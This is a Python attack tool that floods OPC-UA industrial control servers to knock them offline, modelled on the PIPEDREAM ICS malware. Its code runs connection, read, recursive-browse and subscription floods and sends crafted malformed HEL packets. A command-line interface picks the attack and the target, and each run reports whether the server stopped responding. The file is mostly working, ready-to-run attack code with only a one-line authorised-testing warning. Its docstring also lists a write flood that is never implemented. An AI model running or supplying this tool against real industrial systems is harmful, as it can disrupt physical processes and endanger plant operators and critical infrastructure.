#!/usr/bin/env python3
"""
OPC-UA Denial of Service Module

PIPEDREAM-style DoS attacks against OPC-UA servers.

Attack Types:
1. Connection Flood - Rapid connect/disconnect
2. Read Flood - Overwhelm with read requests
3. Browse Flood - Recursive node browsing
4. Subscription Flood - Create many subscriptions
5. Write Flood - Rapid write requests

This replicates the disruption capabilities of real ICS malware.

WARNING: For authorized security testing only!
"""

import asyncio
import logging
import sys
import time
import socket
import struct
from typing import List, Optional
from dataclasses import dataclass
from concurrent.futures import ThreadPoolExecutor

# Setup logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[logging.StreamHandler(sys.stdout)]
)
logger = logging.getLogger('OPCUADoS')


@dataclass
class DoSResult:
    """Result of DoS attack"""
    target: str
    attack_type: str
    duration: float
    requests_sent: int
    connections_made: int
    errors: int
    server_responsive: bool


class OPCUADoS:
    """
    OPC-UA Denial of Service Attack Module

    Various attack methods to disrupt OPC-UA server availability.
    """

    def __init__(self, target: str, port: int = 4840):
        self.target = target
        self.port = port
        self.endpoint = f"opc.tcp://{target}:{port}/freeopcua/server/"
        self.running = False
        self.requests_sent = 0
        self.connections_made = 0
        self.errors = 0

    def _reset_stats(self):
        """Reset attack statistics"""
        self.requests_sent = 0
        self.connections_made = 0
        self.errors = 0

    async def check_server_responsive(self) -> bool:
        """Check if server is still responding"""
        try:
            from asyncua import Client

            client = Client(url=self.endpoint)
            client.set_timeout(5)
            await client.connect()
            await client.disconnect()
            return True
        except:
            return False

    async def connection_flood(self, duration: int = 30, threads: int = 10) -> DoSResult:
        """
        Connection Flood Attack

        Rapidly creates and drops connections to exhaust server resources.
        """
        logger.info(f"\n{'='*60}")
        logger.info("CONNECTION FLOOD ATTACK")
        logger.info(f"{'='*60}")
        logger.info(f"Target:   {self.target}:{self.port}")
        logger.info(f"Duration: {duration} seconds")
        logger.info(f"Threads:  {threads}")
        logger.info(f"{'='*60}\n")

        self._reset_stats()
        self.running = True
        start_time = time.time()
        end_time = start_time + duration

        async def flood_worker():
            while self.running and time.time() < end_time:
                try:
                    # TCP-level connection flood
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(2)
                    sock.connect((self.target, self.port))
                    self.connections_made += 1
                    sock.close()
                except Exception as e:
                    self.errors += 1

                await asyncio.sleep(0.01)

        # Run multiple workers
        tasks = [asyncio.create_task(flood_worker()) for _ in range(threads)]
        await asyncio.gather(*tasks)

        self.running = False
        actual_duration = time.time() - start_time

        # Check if server still responsive
        logger.info("\n[*] Checking server responsiveness...")
        responsive = await self.check_server_responsive()

        result = DoSResult(
            target=self.target,
            attack_type="Connection Flood",
            duration=actual_duration,
            requests_sent=0,
            connections_made=self.connections_made,
            errors=self.errors,
            server_responsive=responsive
        )

        self._print_result(result)
        return result

    async def read_flood(self, duration: int = 30, threads: int = 5) -> DoSResult:
        """
        Read Flood Attack

        Overwhelms server with read requests.
        """
        logger.info(f"\n{'='*60}")
        logger.info("READ FLOOD ATTACK")
        logger.info(f"{'='*60}")
        logger.info(f"Target:   {self.target}:{self.port}")
        logger.info(f"Duration: {duration} seconds")
        logger.info(f"Threads:  {threads}")
        logger.info(f"{'='*60}\n")

        self._reset_stats()
        self.running = True
        start_time = time.time()
        end_time = start_time + duration

        async def read_worker():
            try:
                from asyncua import Client

                client = Client(url=self.endpoint)
                client.set_timeout(30)
                await client.connect()
                self.connections_made += 1

                # Get server status node (always exists)
                status_node = client.get_node("ns=0;i=2256")

                while self.running and time.time() < end_time:
                    try:
                        await status_node.read_value()
                        self.requests_sent += 1
                    except Exception:
                        self.errors += 1

                await client.disconnect()

            except Exception as e:
                self.errors += 1
                logger.debug(f"Worker error: {e}")

        # Run multiple workers
        tasks = [asyncio.create_task(read_worker()) for _ in range(threads)]
        await asyncio.gather(*tasks)

        self.running = False
        actual_duration = time.time() - start_time

        # Check if server still responsive
        logger.info("\n[*] Checking server responsiveness...")
        responsive = await self.check_server_responsive()

        result = DoSResult(
            target=self.target,
            attack_type="Read Flood",
            duration=actual_duration,
            requests_sent=self.requests_sent,
            connections_made=self.connections_made,
            errors=self.errors,
            server_responsive=responsive
        )

        self._print_result(result)
        return result

    async def browse_flood(self, duration: int = 30, threads: int = 3) -> DoSResult:
        """
        Browse Flood Attack

        Recursively browses node tree to exhaust server resources.
        """
        logger.info(f"\n{'='*60}")
        logger.info("BROWSE FLOOD ATTACK")
        logger.info(f"{'='*60}")
        logger.info(f"Target:   {self.target}:{self.port}")
        logger.info(f"Duration: {duration} seconds")
        logger.info(f"Threads:  {threads}")
        logger.info(f"{'='*60}\n")

        self._reset_stats()
        self.running = True
        start_time = time.time()
        end_time = start_time + duration

        async def recursive_browse(client, node, depth=0):
            if not self.running or time.time() >= end_time:
                return

            if depth > 10:  # Limit depth
                return

            try:
                children = await node.get_children()
                self.requests_sent += 1

                for child in children:
                    if not self.running or time.time() >= end_time:
                        return
                    await recursive_browse(client, child, depth + 1)

            except Exception:
                self.errors += 1

        async def browse_worker():
            try:
                from asyncua import Client

                client = Client(url=self.endpoint)
                client.set_timeout(30)
                await client.connect()
                self.connections_made += 1

                root = client.get_root_node()

                while self.running and time.time() < end_time:
                    await recursive_browse(client, root)

                await client.disconnect()

            except Exception as e:
                self.errors += 1
                logger.debug(f"Worker error: {e}")

        # Run multiple workers
        tasks = [asyncio.create_task(browse_worker()) for _ in range(threads)]
        await asyncio.gather(*tasks)

        self.running = False
        actual_duration = time.time() - start_time

        # Check if server still responsive
        logger.info("\n[*] Checking server responsiveness...")
        responsive = await self.check_server_responsive()

        result = DoSResult(
            target=self.target,
            attack_type="Browse Flood",
            duration=actual_duration,
            requests_sent=self.requests_sent,
            connections_made=self.connections_made,
            errors=self.errors,
            server_responsive=responsive
        )

        self._print_result(result)
        return result

    async def subscription_flood(self, duration: int = 30, subs_per_connection: int = 100) -> DoSResult:
        """
        Subscription Flood Attack

        Creates many subscriptions to exhaust server resources.
        """
        logger.info(f"\n{'='*60}")
        logger.info("SUBSCRIPTION FLOOD ATTACK")
        logger.info(f"{'='*60}")
        logger.info(f"Target:         {self.target}:{self.port}")
        logger.info(f"Duration:       {duration} seconds")
        logger.info(f"Subs/Connection:{subs_per_connection}")
        logger.info(f"{'='*60}\n")

        self._reset_stats()
        self.running = True
        start_time = time.time()
        end_time = start_time + duration

        try:
            from asyncua import Client

            while self.running and time.time() < end_time:
                try:
                    client = Client(url=self.endpoint)
                    client.set_timeout(30)
                    await client.connect()
                    self.connections_made += 1

                    # Create many subscriptions
                    subscriptions = []
                    for _ in range(subs_per_connection):
                        if not self.running or time.time() >= end_time:
                            break

                        try:
                            sub = await client.create_subscription(100, None)
                            subscriptions.append(sub)
                            self.requests_sent += 1
                        except Exception:
                            self.errors += 1
                            break

                    # Keep subscriptions alive briefly
                    await asyncio.sleep(1)

                    # Cleanup
                    for sub in subscriptions:
                        try:
                            await sub.delete()
                        except:
                            pass

                    await client.disconnect()

                except Exception as e:
                    self.errors += 1
                    logger.debug(f"Connection error: {e}")

        except ImportError:
            logger.error("[-] asyncua not installed")

        self.running = False
        actual_duration = time.time() - start_time

        # Check if server still responsive
        logger.info("\n[*] Checking server responsiveness...")
        responsive = await self.check_server_responsive()

        result = DoSResult(
            target=self.target,
            attack_type="Subscription Flood",
            duration=actual_duration,
            requests_sent=self.requests_sent,
            connections_made=self.connections_made,
            errors=self.errors,
            server_responsive=responsive
        )

        self._print_result(result)
        return result

    async def malformed_packet_attack(self, duration: int = 30) -> DoSResult:
        """
        Malformed Packet Attack

        Sends malformed OPC-UA packets to trigger parsing errors.
        """
        logger.info(f"\n{'='*60}")
        logger.info("MALFORMED PACKET ATTACK")
        logger.info(f"{'='*60}")
        logger.info(f"Target:   {self.target}:{self.port}")
        logger.info(f"Duration: {duration} seconds")
        logger.info(f"{'='*60}\n")

        self._reset_stats()
        self.running = True
        start_time = time.time()
        end_time = start_time + duration

        # OPC-UA message types
        malformed_packets = [
            # Invalid message type
            b'XXX' + b'\x00' * 100,

            # Hello with wrong size
            b'HEL' + b'F' + struct.pack('<I', 0xFFFFFFFF) + b'\x00' * 50,

            # Truncated hello
            b'HELF\x10\x00\x00\x00',

            # Invalid protocol version
            b'HELF\x1c\x00\x00\x00\xFF\xFF\xFF\xFF' + b'\x00' * 20,

            # Oversized buffer request
            b'HELF\x1c\x00\x00\x00\x00\x00\x00\x00' + struct.pack('<I', 0x7FFFFFFF) * 4,

            # Random binary data
            bytes([i % 256 for i in range(200)]),
        ]

        while self.running and time.time() < end_time:
            for packet in malformed_packets:
                if not self.running or time.time() >= end_time:
                    break

                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(2)
                    sock.connect((self.target, self.port))
                    self.connections_made += 1

                    sock.send(packet)
                    self.requests_sent += 1

                    # Try to receive response
                    try:
                        sock.recv(1024)
                    except:
                        pass

                    sock.close()

                except Exception:
                    self.errors += 1

                await asyncio.sleep(0.1)

        self.running = False
        actual_duration = time.time() - start_time

        # Check if server still responsive
        logger.info("\n[*] Checking server responsiveness...")
        responsive = await self.check_server_responsive()

        result = DoSResult(
            target=self.target,
            attack_type="Malformed Packet",
            duration=actual_duration,
            requests_sent=self.requests_sent,
            connections_made=self.connections_made,
            errors=self.errors,
            server_responsive=responsive
        )

        self._print_result(result)
        return result

    def stop(self):
        """Stop the attack"""
        self.running = False
        logger.info("[*] Stopping attack...")

    def _print_result(self, result: DoSResult):
        """Print attack result"""
        print(f"\n{'='*60}")
        print("ATTACK RESULT")
        print(f"{'='*60}")
        print(f"Target:       {result.target}")
        print(f"Attack Type:  {result.attack_type}")
        print(f"Duration:     {result.duration:.1f} seconds")
        print(f"Connections:  {result.connections_made}")
        print(f"Requests:     {result.requests_sent}")
        print(f"Errors:       {result.errors}")
        print(f"Rate:         {result.requests_sent / result.duration:.1f} req/s")

        if result.server_responsive:
            print(f"\n[+] Server is still RESPONSIVE")
        else:
            print(f"\n[!] Server is NOT RESPONSIVE - DoS successful!")

        print(f"{'='*60}\n")


async def main():
    """Test DoS attacks"""
    import argparse

    parser = argparse.ArgumentParser(description='OPC-UA DoS Attack Module')
    parser.add_argument('--target', '-t', default='192.168.1.6',
                        help='Target IP (default: 192.168.1.6)')
    parser.add_argument('--port', '-p', type=int, default=4840,
                        help='OPC-UA port (default: 4840)')
    parser.add_argument('--attack', '-a', required=True,
                        choices=['connection', 'read', 'browse', 'subscription', 'malformed'],
                        help='Attack type')
    parser.add_argument('--duration', '-d', type=int, default=30,
                        help='Attack duration in seconds (default: 30)')
    parser.add_argument('--threads', type=int, default=5,
                        help='Number of threads (default: 5)')

    args = parser.parse_args()

    dos = OPCUADoS(args.target, args.port)

    if args.attack == 'connection':
        await dos.connection_flood(args.duration, args.threads)
    elif args.attack == 'read':
        await dos.read_flood(args.duration, args.threads)
    elif args.attack == 'browse':
        await dos.browse_flood(args.duration, args.threads)
    elif args.attack == 'subscription':
        await dos.subscription_flood(args.duration)
    elif args.attack == 'malformed':
        await dos.malformed_packet_attack(args.duration)


if __name__ == '__main__':
    asyncio.run(main())
